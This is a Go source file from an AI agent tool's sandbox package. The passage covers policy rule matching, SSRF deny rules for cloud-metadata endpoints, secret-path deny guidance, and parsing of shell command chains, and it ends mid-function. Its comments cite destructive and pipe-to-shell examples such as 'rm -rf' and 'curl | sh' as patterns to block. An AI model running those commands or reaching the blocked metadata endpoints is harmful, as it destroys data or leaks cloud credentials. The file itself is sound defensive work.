package sandbox

import (
	"container/list"
	"context"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"regexp/syntax"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/ersinkoc/dfmt/internal/safefs"
)

const langBash = "bash"

const (
	maxGrepPatternBytes  = 4096
	maxGrepPatternNodes  = 1024
	maxGrepRepeatNesting = 3
)

// Policy represents a security policy for sandbox operations.
type Policy struct {
	Version int
	Allow   []Rule
	Deny    []Rule
}

// Rule is a single allow or deny rule.
//
// `re` is an optional precompiled regex for `Text`. When non-nil, Match
// uses it directly and skips the global LRU cache lookup; this is the
// hot-path optimization for Policy.Evaluate (a sandbox tool call walks
// the entire allow/deny list, so any per-rule allocation multiplies).
//
// Rule is exposed as a value type and a copy retains the same `re`
// pointer, so range-iterating `policy.Allow` (which yields copies) does
// not lose the precompile. `re` stays unexported so YAML / JSON
// marshalers ignore it.
type Rule struct {
	Op   string // "exec" | "read" | "fetch"
	Text string // Pattern to match
	re   *regexp.Regexp
}

// Compile precompiles the rule's glob into a regex and stores it on the
// receiver. Idempotent; safe to call multiple times. A compile failure
// leaves `re` nil so Match falls back to the LRU-cached path. The
// fallback is correct, just allocates more — the failure mode is
// "slower," not "wrong."
func (r *Rule) Compile() {
	var pattern string
	if r.Op == "exec" {
		pattern = globToRegexShell(r.Text)
	} else {
		pattern = globToRegex(strings.ReplaceAll(r.Text, `\`, "/"))
	}
	re, err := regexp.Compile(pattern)
	if err != nil {
		return
	}
	r.re = re
}

// Match checks if a rule matches the given operation and text. When the
// rule has been Compile()'d, the precompiled regex is used directly
// (zero-alloc on the hot path); otherwise globMatch is invoked, which
// walks the LRU cache.
func (r Rule) Match(op, text string) bool {
	if r.Op != op {
		return false
	}
	if r.re == nil {
		return globMatch(r.Text, text, op)
	}
	if op != "exec" {
		text = strings.ReplaceAll(text, `\`, "/")
	}
	return r.re.MatchString(text)
}

// CompileAll precompiles every rule in the policy. Called from
// DefaultPolicy / LoadPolicy / MergePolicies so production paths never
// hit the LRU fallback. Tests that construct Policy literals can opt in
// by calling this; the fallback path keeps them correct without it.
func (p *Policy) CompileAll() {
	for i := range p.Allow {
		p.Allow[i].Compile()
	}
	for i := range p.Deny {
		p.Deny[i].Compile()
	}
}

// Evaluate checks the policy for a given operation.
// Returns true if allowed, false if denied.
func (p Policy) Evaluate(op, text string) bool {
	// Check deny rules first
	for _, rule := range p.Deny {
		if rule.Match(op, text) {
			return false
		}
	}

	// Check allow rules (if any are specified, only matched ones are allowed)
	if len(p.Allow) > 0 {
		for _, rule := range p.Allow {
			if rule.Match(op, text) {
				return true
			}
		}
		return false
	}

	// No allow rules means everything is allowed (except denied)
	return true
}

// DefaultPolicy returns the default security policy.
//
// The default `read **` and `write **` allow rules let agents navigate
// the working directory freely. Sensitive paths (`.env*`, `**/secrets/**`,
// `**/id_rsa`, `**/id_*`, `.dfmt/**`, `.git/**`) are explicitly denied —
// the deny list is checked first and is the only gate on those paths.
//
// Operators with site-specific secret directories beyond the standard
// shapes (e.g. `creds/`, `private_keys/`, `ca-bundles/`, custom vault
// mounts) should extend the policy with project-level deny rules. The
// canonical location is `.dfmt/permissions.yaml` (loaded via
// `LoadPolicy`) — entries take the form:
//
//	deny:read:creds/**
//	deny:read:**/private_keys/**
//	deny:write:creds/**
//	deny:edit:creds/**
//
// Closes F-A-LOW-1 from the security audit (operator-facing guidance
// for non-standard secret stores).
func DefaultPolicy() Policy {
	p := Policy{
		Version: 1,
		Allow: []Rule{
			// default-permissive exec: all exec commands allowed.
			// Add specific deny rules in permissions.yaml to restrict.
			{Op: "exec", Text: "**"},
			// Read/write/edit/fetch explicitly allowed.
			{Op: "read", Text: "**"},
			{Op: "write", Text: "**"},
			{Op: "edit", Text: "**"},
			{Op: "fetch", Text: "https://*"},
			{Op: "fetch", Text: "http://*"},
		},
		Deny: []Rule{
			// SSRF: block cloud metadata IPs and file:// scheme.
			{Op: "fetch", Text: "http://169.254.169.254/**"},
			{Op: "fetch", Text: "https://169.254.169.254/**"},
			{Op: "fetch", Text: "http://168.63.129.16/**"},
			{Op: "fetch", Text: "https://168.63.129.16/**"},
			{Op: "fetch", Text: "http://metadata.google.internal/**"},
			{Op: "fetch", Text: "https://metadata.google.internal/**"},
			{Op: "fetch", Text: "http://metadata.goog/**"},
			{Op: "fetch", Text: "https://metadata.goog/**"},
			{Op: "fetch", Text: "http://metadata.goog.internal/**"},
			{Op: "fetch", Text: "https://metadata.goog.internal/**"},
			{Op: "fetch", Text: "http://metadata.goog.com/**"},
			{Op: "fetch", Text: "https://metadata.goog.com/**"},
			{Op: "fetch", Text: "file:///**"},
		},
	}
	p.CompileAll()
	return p
}

// hardDenyExecBaseCommands lists exec base commands that an operator
// override (`.dfmt/permissions.yaml`) cannot re-enable via an `allow:exec:…`
// rule. Currently empty — all exec commands are allowed by default.
// This map exists so operators can restrict commands in permissions.yaml
// and so future security-hardening can add entries here.
//
// Path-style allow rules (`allow:read:`, `allow:write:`, `allow:fetch:`) are
// passed through unchanged; this list is exec-only.
//
// See ADR-0014 for the wiring decision and merge semantics.
var hardDenyExecBaseCommands = map[string]struct{}{}

// isHardDenyExec reports whether ruleText (an exec rule's `Text`) targets a
// hard-deny base command. The base command is the first whitespace-separated
// token; a leading directory and case are stripped.
func isHardDenyExec(ruleText string) bool {
	fields := strings.Fields(ruleText)
	if len(fields) == 0 {
		return false
	}
	cmd := strings.ToLower(filepath.Base(fields[0]))
	cmd = strings.TrimSuffix(cmd, ".exe")
	_, ok := hardDenyExecBaseCommands[cmd]
	return ok
}

// MergePolicies composes a base policy with an operator-supplied override.
// The result's Allow list is `base.Allow ++ override.Allow`, except that
// override Allow rules whose exec base command is on the hard-deny list are
// silently dropped — the dropped rule's text is appended to warnings so the
// caller can surface it (operator typo, attempted relaxation of the default
// security stance).
//
// Deny rules union without filtering: operators can always tighten.
//
// The hard-deny invariant exists because `DefaultPolicy()`'s exec whitelist
// alone is not sufficient — without this guard a single permissive override
// line (`allow:exec:rm *`) would re-enable destructive commands the default
// policy intentionally withholds. ADR-0014 documents the decision.
func MergePolicies(base, override Policy) (Policy, []string) {
	out := Policy{
		Version: base.Version,
		Allow:   make([]Rule, 0, len(base.Allow)+len(override.Allow)),
		Deny:    make([]Rule, 0, len(base.Deny)+len(override.Deny)),
	}
	out.Allow = append(out.Allow, base.Allow...)
	out.Deny = append(out.Deny, base.Deny...)

	var warnings []string
	for _, r := range override.Allow {
		if r.Op == "exec" && isHardDenyExec(r.Text) {
			warnings = append(warnings,
				fmt.Sprintf("override allow:exec:%s ignored (hard-deny base command)", r.Text))
			continue
		}
		out.Allow = append(out.Allow, r)
	}
	out.Deny = append(out.Deny, override.Deny...)
	out.CompileAll()
	return out, warnings
}

// PolicyLoadResult carries everything a caller needs to surface the override
// state to the operator (doctor row, daemon startup log).
type PolicyLoadResult struct {
	Policy        Policy   // composed policy ready for NewSandboxWithPolicy
	OverridePath  string   // absolute path checked; empty when no override file expected
	OverrideFound bool     // override file existed and was parsed
	OverrideRules int      // count of rules merged in from the override
	Warnings      []string // hard-deny masked allows + parse-time hints
}

// LoadPolicyMerged returns the effective policy for a project. If
// `<projectPath>/.dfmt/permissions.yaml` exists it is parsed and merged on
// top of `DefaultPolicy()` via MergePolicies; otherwise DefaultPolicy is
// returned unchanged. A missing file is not an error.
//
// The caller is expected to log Warnings (operator visibility) and to use
// the OverrideFound / OverrideRules fields for the doctor "permissions.yaml"
// row.
func LoadPolicyMerged(projectPath string) (PolicyLoadResult, error) {
	res := PolicyLoadResult{Policy: DefaultPolicy()}
	if projectPath == "" {
		return res, nil
	}
	overridePath := filepath.Join(projectPath, ".dfmt", "permissions.yaml")
	res.OverridePath = overridePath

	if _, err := os.Stat(overridePath); err != nil {
		if os.IsNotExist(err) {
			return res, nil
		}
		return res, fmt.Errorf("stat %s: %w", overridePath, err)
	}

	override, err := LoadPolicy(overridePath)
	if err != nil {
		return res, fmt.Errorf("load %s: %w", overridePath, err)
	}
	merged, warns := MergePolicies(res.Policy, *override)
	res.Policy = merged
	res.OverrideFound = true
	res.OverrideRules = len(override.Allow) + len(override.Deny)
	res.Warnings = warns
	return res, nil
}

// LoadPolicy loads a policy from a file.
func LoadPolicy(path string) (*Policy, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, fmt.Errorf("permissions file not found: %s", path)
		}
		return nil, err
	}

	// Simple format: "allow:exec:git *" lines
	policy := &Policy{Version: 1}
	lines := strings.Split(string(data), "\n")

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.SplitN(line, ":", 3)
		if len(parts) != 3 {
			continue
		}

		action := strings.TrimSpace(parts[0])
		op := strings.TrimSpace(parts[1])
		text := strings.TrimSpace(parts[2])

		rule := Rule{Op: op, Text: text}
		switch action {
		case "allow":
			policy.Allow = append(policy.Allow, rule)
		case "deny":
			policy.Deny = append(policy.Deny, rule)
		}
	}

	policy.CompileAll()
	return policy, nil
}

// globMatch does simple glob matching (* matches any number of chars).
// For exec operations, * matches anything (shell-style).
// For read/write/edit/fetch operations, * doesn't match / (path-style).
func globMatch(pattern, text string, op string) bool {
	// Normalize Windows path separators for every path-style op so rules
	// written with forward slashes (e.g. "**/id_rsa", "**/.env*") match
	// `C:\Users\x\id_rsa` and `C:\proj\.env` regardless of which OS dfmt
	// is running on. F-03 closure: the previous version normalized only
	// the read op, so an agent on Windows could write through the deny
	// list because `**/.env*` did not match the backslash-separated
	// cleanPath. We use strings.ReplaceAll, NOT filepath.ToSlash, because
	// the latter is a no-op on Unix (where '\' is a valid filename byte)
	// and that lets a Windows-shaped path slip past the deny rules when
	// the daemon happens to run under WSL/Linux. Exec text is a shell
	// command (not a path) and must NOT be normalized — `git\branch` is a
	// literal-backslash arg and reparsing it would corrupt the matcher.
	if op != "exec" {
		text = strings.ReplaceAll(text, `\`, "/")
		pattern = strings.ReplaceAll(pattern, `\`, "/")
	}
	// For exec operations, use shell-style globbing where * matches anything including /
	// For path-style ops, * doesn't match / (path segments)
	if op == "exec" {
		regex := globToRegexShell(pattern)
		return regexMatch(regex, text)
	}
	// Convert glob pattern to regex for path-style ops
	regex := globToRegex(pattern)
	return regexMatch(regex, text)
}

// globMatchDefault is for tests and direct calls that don't specify an operation.
// Uses path-style matching where * doesn't match / for backward compatibility.
func globMatchDefault(pattern, text string) bool {
	regex := globToRegex(pattern)
	return regexMatch(regex, text)
}

func globToRegexShell(pattern string) string {
	// Shell-style globbing: * matches anything including /
	// But /* means / followed by something (not just / alone)
	var result strings.Builder
	i := 0
	for i < len(pattern) {
		if i+1 < len(pattern) && pattern[i] == '*' && pattern[i+1] == '*' {
			// ** matches anything including path separators
			result.WriteString(".*")
			i += 2
		} else if i+1 < len(pattern) && pattern[i] == '/' && pattern[i+1] == '*' {
			// /* means / followed by at least one character (like shell glob)
			if i+2 < len(pattern) && pattern[i+2] == '*' {
				// /** — matches zero or more path segments after /
				result.WriteString("/.*")
				i += 3
			} else {
				result.WriteString("/.+")
				i += 2
			}
		} else if pattern[i] == '*' {
			result.WriteString(".*") // * matches anything
			i++
		} else if pattern[i] == '?' {
			result.WriteByte('.')
			i++
		} else {
			// Escape regex metacharacters so user-authored patterns like
			// "api.example.com" don't have their dots interpreted as any-char
			// (silently broadening the match). The glob tokens we recognize
			// (* ** ? /) were already handled above.
			result.WriteString(regexp.QuoteMeta(string(pattern[i])))
			i++
		}
	}
	return "^" + result.String() + "$"
}

func globToRegex(pattern string) string {
	var result strings.Builder
	i := 0
	for i < len(pattern) {
		if i+1 < len(pattern) && pattern[i] == '*' && pattern[i+1] == '*' {
			// ** matches anything including path separators
			result.WriteString(".*")
			i += 2
		} else if pattern[i] == '*' {
			// Single * - for URL patterns like http://* or https://*, * must
			// match anything including /. The check i>=3 && pattern[i-3:i]
			// is `://` detects this and writes `.*` instead of `[^/]*`.
			if i >= 3 && pattern[i-3] == ':' && pattern[i-2] == '/' && pattern[i-1] == '/' {
				result.WriteString(".*")
			} else {
				result.WriteString("[^/]*")
			}
			i++
		} else if i+2 < len(pattern) && pattern[i] == '/' && pattern[i+1] == '*' && pattern[i+2] == '*' {
			// /** — matches zero or more path segments after /.
			// Must check BEFORE the single /* branch since /* would match the
			// first * and leave the second star to be processed next.
			result.WriteString("/.*")
			i += 3
		} else if i+1 < len(pattern) && pattern[i] == '/' && pattern[i+1] == '*' {
			// /* at end matches any non-empty path segment after /.
			// Skip if this is part of ://* URL pattern (://* should use .*)
			if i >= 2 && pattern[i-2] == ':' && pattern[i-1] == '/' {
				result.WriteByte(pattern[i])
				i++
			} else {
				result.WriteString("/[^/]+")
				i += 2
			}
		} else if pattern[i] == '?' {
			result.WriteByte('.')
			i++
		} else {
			// Escape regex metacharacters — same reasoning as in
			// globToRegexShell. Without this, a rule text like "a+b" fails
			// to compile or, worse, patterns with literal dots broaden
			// silently.
			result.WriteString(regexp.QuoteMeta(string(pattern[i])))
			i++
		}
	}
	return "^" + result.String() + "$"
}

// regexLRU is a small bounded LRU cache for compiled glob-derived regex patterns.
// Without a bound, loading a policy with thousands of unique rules would grow
// the cache indefinitely.
const regexLRUMaxEntries = 512

type regexLRUCache struct {
	mu      sync.Mutex
	order   *list.List
	entries map[string]*list.Element
}

type regexLRUEntry struct {
	key string
	re  *regexp.Regexp
}

var regexCache = &regexLRUCache{
	order:   list.New(),
	entries: make(map[string]*list.Element),
}

func (c *regexLRUCache) get(key string) (*regexp.Regexp, bool) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if el, ok := c.entries[key]; ok {
		c.order.MoveToFront(el)
		return el.Value.(*regexLRUEntry).re, true
	}
	return nil, false
}

func (c *regexLRUCache) put(key string, re *regexp.Regexp) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if el, ok := c.entries[key]; ok {
		el.Value.(*regexLRUEntry).re = re
		c.order.MoveToFront(el)
		return
	}
	el := c.order.PushFront(&regexLRUEntry{key: key, re: re})
	c.entries[key] = el
	for c.order.Len() > regexLRUMaxEntries {
		oldest := c.order.Back()
		if oldest == nil {
			break
		}
		c.order.Remove(oldest)
		delete(c.entries, oldest.Value.(*regexLRUEntry).key)
	}
}

func regexMatch(pattern, text string) bool {
	if re, ok := regexCache.get(pattern); ok {
		return re.MatchString(text)
	}
	re, err := regexp.Compile(pattern)
	if err != nil {
		return false
	}
	regexCache.put(pattern, re)
	return re.MatchString(text)
}

// SandboxImpl is the default sandbox implementation.
type SandboxImpl struct {
	runtimes    *Runtimes
	policy      Policy
	wd          string   // Working directory
	pathPrepend []string // Absolute dirs prepended to PATH for every exec; populated from cfg.Exec.PathPrepend
}

// WithPathPrepend returns the sandbox after attaching the given list of
// absolute directories. They are prepended to PATH (in order, dedup'd
// against the inherited PATH) for every Exec call. Closes the recurring
// "exit 127" symptom when the daemon was auto-started from a shell that
// did not have the user's language toolchains on PATH.
func (s *SandboxImpl) WithPathPrepend(dirs []string) *SandboxImpl {
	if len(dirs) == 0 {
		s.pathPrepend = nil
		return s
	}
	out := make([]string, 0, len(dirs))
	for _, d := range dirs {
		if d != "" {
			out = append(out, d)
		}
	}
	s.pathPrepend = out
	return s
}

// ValidatePathPrepend inspects each absolute directory in dirs for
// configuration smells the operator should know about (V-11). It does NOT
// mutate state and does not refuse the daemon — it returns one human-
// readable warning per problem so the caller (typically Daemon.Start) can
// surface them via logging.Warnf. Empty input returns nil. Each entry is
// checked in turn; the failure modes flagged are:
//
//   - Path does not exist (likely a typo; the entry is silently a no-op
//     until it appears, but operators usually want to know).
//   - Path exists but is world-writable (any local user can plant a
//     binary that the sandbox will then resolve before system tools).
//
// Per-uid writability is not checked: it would require platform-specific
// uid/gid plumbing for marginal benefit on a single-user workstation.
func ValidatePathPrepend(dirs []string) error {
	if len(dirs) == 0 {
		return nil
	}
	var errs []error
	for _, d := range dirs {
		if d == "" {
			continue
		}
		fi, err := os.Stat(d)
		if err != nil {
			if os.IsNotExist(err) {
				errs = append(errs, fmt.Errorf("path_prepend entry %q does not exist", d))
				continue
			}
			errs = append(errs, fmt.Errorf("path_prepend entry %q stat failed: %v", d, err))
			continue
		}
		if !fi.IsDir() {
			errs = append(errs, fmt.Errorf("path_prepend entry %q is not a directory", d))
			continue
		}
		// World-writable detection. Windows ACLs don't map cleanly to the
		// Unix mode bits, so the check is Unix-only by Mode() Perm() bits;
		// on Windows fi.Mode().Perm() returns the synthesized bits which
		// don't reflect ACLs, so this is a no-op there (operators on
		// Windows must rely on file-system ACL hygiene separately).
		if fi.Mode().Perm()&0o002 != 0 {
			errs = append(errs, fmt.Errorf("path_prepend entry %q is world-writable (mode=%o); a local attacker can plant binaries that the sandbox will resolve before system tools", d, fi.Mode().Perm()))
		}
	}
	if len(errs) > 0 {
		return errors.Join(errs...)
	}
	return nil
}

// NewSandbox creates a new sandbox instance.
func NewSandbox(wd string) *SandboxImpl {
	return &SandboxImpl{
		runtimes: NewRuntimes(),
		policy:   DefaultPolicy(),
		wd:       wd,
	}
}

// NewSandboxWithPolicy creates a sandbox with a custom policy.
func NewSandboxWithPolicy(wd string, policy Policy) *SandboxImpl {
	return &SandboxImpl{
		runtimes: NewRuntimes(),
		policy:   policy,
		wd:       wd,
	}
}

// NewSandboxWithPolicyAndRuntimes creates a sandbox with custom policy and runtimes.
func NewSandboxWithPolicyAndRuntimes(wd string, policy Policy, runtimes *Runtimes) *SandboxImpl {
	return &SandboxImpl{
		runtimes: runtimes,
		policy:   policy,
		wd:       wd,
	}
}

// SetWorkingDir sets the working directory for exec operations.
func (s *SandboxImpl) SetWorkingDir(wd string) {
	s.wd = wd
}

// PolicyCheck checks if an operation is allowed by the policy.
func (s *SandboxImpl) PolicyCheck(op, text string) error {
	if !s.policy.Evaluate(op, text) {
		return fmt.Errorf("operation denied by policy: %s %s\n%s", op, text, policyDenyHint(op))
	}
	return nil
}

// policyDenyHint returns a one-line, actionable suffix appended to every
// "operation denied by policy" error. Without it the user sees only what was
// blocked, never how to unblock it — and the canonical override location
// (.dfmt/permissions.yaml, loaded by LoadPolicy) is undiscoverable.
//
// We deliberately do NOT split allow-miss vs. deny-hit here: PolicyCheck's
// caller can't tell which branch tripped, and for the user the remediation
// is the same — open .dfmt/permissions.yaml. A few op-specific notes (cloud
// metadata for fetch, secret paths for read/write/edit) are added so users
// don't try to "fix" things that are deliberately walled off.
func policyDenyHint(op string) string {
	switch op {
	case "exec":
		return "  hint: all exec commands are allowed by default.\n" +
			"        Use .dfmt/permissions.yaml to restrict commands if needed."
	case "read":
		return "  hint: all read operations are allowed by default.\n" +
			"        Use .dfmt/permissions.yaml to restrict paths if needed."
	case "write", "edit":
		return "  hint: all write/edit operations are allowed by default.\n" +
			"        Use .dfmt/permissions.yaml to restrict paths if needed."
	case "fetch":
		return "  hint: .dfmt/permissions.yaml to review fetch rules — blocked by SSRF\n" +
			"        defenses (cloud-metadata IPs, loopback, RFC1918, link-local,\n" +
			"        file://) or an explicit deny rule. SSRF IP classes cannot be allow-listed."
	default:
		return "  hint: see .dfmt/permissions.yaml to inspect or override the policy."
	}
}

// stripExeSuffixFromLeadingWord strips a Windows-style `.exe` suffix from the
// first word of cmd so a single policy rule like `go *` covers both `go test`
// and `go.exe test`. The rest of the command (arguments, redirections,
// chains) is returned verbatim. Mirrors extractBaseCommand's behavior for the
// full-command policy paths in Exec.
func stripExeSuffixFromLeadingWord(cmd string) string {
	leadingSpaces := 0
	for leadingSpaces < len(cmd) && (cmd[leadingSpaces] == ' ' || cmd[leadingSpaces] == '\t') {
		leadingSpaces++
	}
	rest := cmd[leadingSpaces:]
	inQuote := false
	quoteChar := byte(0)
	end := len(rest)
	for i := 0; i < len(rest); i++ {
		c := rest[i]
		if !inQuote && (c == '"' || c == '\'') {
			inQuote = true
			quoteChar = c
		} else if inQuote && c == quoteChar {
			inQuote = false
		} else if !inQuote && (c == ' ' || c == '\t') {
			end = i
			break
		}
	}
	leading := rest[:end]
	if len(leading) > 4 && strings.EqualFold(leading[len(leading)-4:], ".exe") {
		return cmd[:leadingSpaces] + leading[:len(leading)-4] + rest[end:]
	}
	return cmd
}

// extractBaseCommand extracts the base command (first word) from a shell command.
//
// On Windows the actual binary carries an `.exe` suffix (`go.exe`, `node.exe`),
// but the policy allow-list rules are written suffix-free (`go`, `node`). To
// keep a single rule covering both invocation styles, a trailing `.exe` (case-
// insensitive) is stripped from the returned base. Filesystem case-sensitivity
// makes this the right call: NTFS treats `Go.exe`, `GO.EXE`, and `go.exe` as
// the same file, so the policy comparison must too.
func extractBaseCommand(cmd string) string {
	// Remove leading/trailing whitespace
	cmd = strings.TrimSpace(cmd)

	// Handle quoted strings - find first unquoted space
	inQuote := false
	quoteChar := byte(0)
	base := cmd
	for i := 0; i < len(cmd); i++ {
		if !inQuote && (cmd[i] == '"' || cmd[i] == '\'') {
			inQuote = true
			quoteChar = cmd[i]
		} else if inQuote && cmd[i] == quoteChar {
			inQuote = false
		} else if !inQuote && cmd[i] == ' ' {
			base = cmd[:i]
			break
		}
	}
	// V-05: strip a matching outer quote pair so a part like
	// `"sudo whoami"` (produced by here-string `bash <<<"sudo whoami"`
	// or generally any quoted opaque token) gets evaluated as
	// `sudo whoami` against the deny-list. Without this, the policy
	// matched the literal `"sudo`, never triggering the `sudo *`
	// deny rule and silently allowing the command. Operator-defined
	// allow rules for programs whose path contains spaces (rare) need
	// to register the unquoted form.
	if len(base) >= 2 {
		first, last := base[0], base[len(base)-1]
		if (first == '"' || first == '\'') && first == last {
			base = base[1 : len(base)-1]
		}
	}
	// Strip leading parentheses (subshell syntax like `(sudo whoami)` or `((sudo whoami)`)
	// so the inner command is evaluated correctly.
	for len(base) > 0 && base[0] == '(' {
		base = base[1:]
	}
	if len(base) > 4 && strings.EqualFold(base[len(base)-4:], ".exe") {
		base = base[:len(base)-4]
	}
	return base
}

// shellOperators returns true if cmd contains shell operators that chain commands.
func hasShellChainOperators(cmd string) bool {
	// Check for common shell operators that chain commands. Bare `&` (POSIX
	// background) is included alongside `&&`: a missing entry here previously
	// let `git --version & sudo whoami` skip the chain-aware split path so the
	// trailing `sudo …` rode past the start-anchored deny rules. See V-1 in
	// security-report/.
	operators := []string{"&&", "||", "&", ";", "|", ">", ">>", "<", "<<", "\n"}
	for _, op := range operators {
		if strings.Contains(cmd, op) {
			return true
		}
	}

	// Check for command substitution patterns
	// Backticks: `command`
	if strings.Contains(cmd, "`") {
		return true
	}
	// $(command) substitution
	if strings.Contains(cmd, "$(") {
		return true
	}
	// Here-documents: <<EOF ... EOF (simplified check for <<)
	if strings.Contains(cmd, "<<") {
		return true
	}
	// V-06: bare (subshell) — e.g. `(sudo whoami)` or `git status; (rm -rf .)`
	// must take the chain-aware split path so the splitter can recurse the
	// subshell body.
	if strings.Contains(cmd, "(") {
		return true
	}

	return false
}

// isRedirectionOperand checks if a token is a shell redirection operand (not a command).
// Examples: "2>&1", "&1", "1>", ">>file", "&2"
func isRedirectionOperand(token string) bool {
	token = strings.TrimSpace(token)
	if token == "" {
		return false
	}
	// Starts with a number followed by > or >>
	if len(token) >= 2 && token[0] >= '0' && token[0] <= '9' {
		if token[1] == '>' || token[1] == '<' {
			return true
		}
	}
	// Just & followed by number (like &1, &2)
	if len(token) >= 2 && token[0] == '&' {
		if token[1] >= '0' && token[1] <= '9' {
			return true
		}
	}
	return false
}

// isEnvAssignment checks if a token is an environment variable assignment (not a command).
// Examples: "GOCACHE=xxx", "HOME=/tmp"
func isEnvAssignment(token string) bool {
	token = strings.TrimSpace(token)
	if token == "" {
		return false
	}
	// Must contain = and not start with a digit
	eqIdx := strings.Index(token, "=")
	if eqIdx <= 0 {
		return false
	}
	// Check that the part before = looks like a valid env var name
	// (starts with letter or underscore, alphanumeric+underscore)
	name := token[:eqIdx]
	if name == "" {
		return false
	}
	first := name[0]
	if (first >= 'a' && first <= 'z') || (first >= 'A' && first <= 'Z') || first == '_' {
		return true
	}
	return false
}

// Exec implements the Sandbox interface.
func (s *SandboxImpl) Exec(ctx context.Context, req ExecReq) (ExecResp, error) {
	// Default to bash when caller omits the language. The MCP schema documents
	// "bash" as the default, but the JSON-RPC layer forwards an empty string
	// when the client omits the field — without this the runtime lookup below
	// fails with "runtime not available:" (empty after the colon).
	if req.Lang == "" {
		req.Lang = langBash
	}
	// Policy check - for shell commands, check each chained command
	cmd := req.Code
	isLangPrefix := req.Lang != "sh" && req.Lang != langBash
	if isLangPrefix {
		cmd = req.Lang + " " + cmd
	}

	// Normalize a Windows-style `.exe` suffix off the leading word so a single
	// rule like `go *` covers both `go ...` and `go.exe ...`. extractBaseCommand
	// already strips for base-only checks; this covers the full-command paths.
	cmdForPolicy := stripExeSuffixFromLeadingWord(cmd)
	// Strip leading parentheses from cmdForPolicy for subshell commands
	// like `(sudo whoami)` so the policy check uses the inner command.
	for len(cmdForPolicy) > 0 && cmdForPolicy[0] == '(' {
		cmdForPolicy = cmdForPolicy[1:]
	}

	// For shell commands with operators, check the full command chain first
	// against deny rules to catch dangerous patterns like "; rm -rf /" or "| sh".
	//
	// V-06 follow-up: only invoke the chain-aware splitter for actual shell
	// languages. Non-shell langs (python, node, ruby, perl) carry their own
	// syntactic punctuation — `print("hi")` would otherwise trigger the new
	// `(` chain detector and bounce off the shell-style baseCmd allow check.
	// Their code never reaches a shell, so shell-operator parsing is wrong.
	if !isLangPrefix && hasShellChainOperators(cmd) {
		// First check: does the base command match any allow rule?
		baseCmd := extractBaseCommand(cmd)
		// Skip env var assignments (e.g., "GOCACHE=xxx go test")
		if baseCmd != "" && !isEnvAssignment(baseCmd) && !s.policy.Evaluate("exec", baseCmd) {
			return ExecResp{}, fmt.Errorf("operation denied by policy: %s: base command '%s' not allowed\n%s", cmd, baseCmd, policyDenyHint("exec"))
		}
		// Second check: does the full command match any deny rule?
		if !s.policy.Evaluate("exec", cmdForPolicy) {
			return ExecResp{}, fmt.Errorf("operation denied by policy: %s: %v\n%s", cmd, "blocked by deny rule", policyDenyHint("exec"))
		}
		// Third check: each individual command (defense in depth)
		// Skip redirection operands (2>&1, 1>, etc.) - they're not commands
		parts := splitByShellOperators(cmd)
		for _, part := range parts {
			part = strings.TrimSpace(part)
			if part == "" {
				continue
			}
			// Skip pure redirection operands like "2>&1", "&1", "1>"
			if isRedirectionOperand(part) {
				continue
			}
			// Skip env assignments (VAR=value)
			if isEnvAssignment(part) {
				continue
			}
			partBase := extractBaseCommand(part)
			if !s.policy.Evaluate("exec", partBase) {
				return ExecResp{}, fmt.Errorf("operation denied by policy: %s: part '%s' not allowed\n%s", cmd, part, policyDenyHint("exec"))
			}
		}
	} else if isLangPrefix {
		// For non-shell single commands, check the full command with lang prefix
		// e.g., "python script.py" against "python *"
		if err := s.PolicyCheck("exec", cmdForPolicy); err != nil {
			return ExecResp{}, err
		}
	} else {
		// For shell single commands, check the full command
		if err := s.PolicyCheck("exec", cmdForPolicy); err != nil {
			return ExecResp{}, err
		}
	}

	// Get runtime (probe if not cached)
	rt, ok := s.runtimes.Get(req.Lang)
	if !ok || !rt.Available {
		_ = s.runtimes.Probe(ctx)
		rt, ok = s.runtimes.Get(req.Lang)
		if !ok || !rt.Available {
			return ExecResp{}, fmt.Errorf("runtime not available: %s", req.Lang)
		}
	}

	// Execute
	return s.execImpl(ctx, req, rt)
}

// splitByShellOperators splits a command string by shell operators.
// Command substitutions `$(...)` and backtick `...` are also split so their
// inner commands are subject to policy evaluation as independent parts.
func splitByShellOperators(cmd string) []string {
	var parts []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)

	flush := func() {
		if current.Len() > 0 {
			parts = append(parts, current.String())
			current.Reset()
		}
	}

	for i := 0; i < len(cmd); i++ {
		c := cmd[i]

		if !inQuote && (c == '"' || c == '\'') {
			inQuote = true
			quoteChar = c
			current.WriteByte(c)
		} else if inQuote && c == quoteChar {
			inQuote = false
			current.WriteByte(c)
		} else if !inQuote {
			// $(...) command substitution: extract the inner part as its own segment,
			// then recursively split it so operators within the substitution are also
			// subject to policy checks. Without this, `curl * | sh` inside $(...) would
			// be matched as a single part against `curl *` and pass even though `| sh`
			// is not permitted.
			if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' {
				flush()
				depth := 1
				j := i + 2
				for j < len(cmd) && depth > 0 {
					switch cmd[j] {
					case '(':
						depth++
					case ')':
						depth--
					}
					if depth == 0 {
						break
					}
					j++
				}
				if j <= len(cmd) && j > i+2 {
					inner := cmd[i+2 : j]
					// Recursively split the substitution content so inner operators
					// (|, &&, ||, ;, etc.) are also checked by the policy.
					innerParts := splitByShellOperators(inner)
					parts = append(parts, innerParts...)
				}
				i = j
				continue
			}
			// Backtick command substitution.
			if c == '`' {
				flush()
				j := i + 1
				for j < len(cmd) && cmd[j] != '`' {
					j++
				}
				if j > i+1 {
					inner := cmd[i+1 : j]
					// Recursively split backtick content so inner operators are also checked.
					innerParts := splitByShellOperators(inner)
					parts = append(parts, innerParts...)
				}
				i = j
				continue
			}
			// V-06: bare (subshell). Mirror the $(...) handling minus the
			// `$` prefix so `(sudo whoami)` and `(cd /tmp; sudo whoami)`
			// don't slip past the per-part allow-list as a single opaque
			// `(sudo` base. Depth-tracked so nested parens parse correctly.
			if c == '(' {
				flush()
				depth := 1
				j := i + 1
				for j < len(cmd) && depth > 0 {
					switch cmd[j] {
					case '(':
						depth++
					case ')':
						depth--
					}
					if depth == 0 {
						break
					}
					j++
				}
				if j <= len(cmd) && j > i+1 {
					inner := cmd[i+1 : j]
					innerParts := splitByShellOperators(inner)
					parts = append(parts, innerParts...)
				}
				i = j
				continue
			}
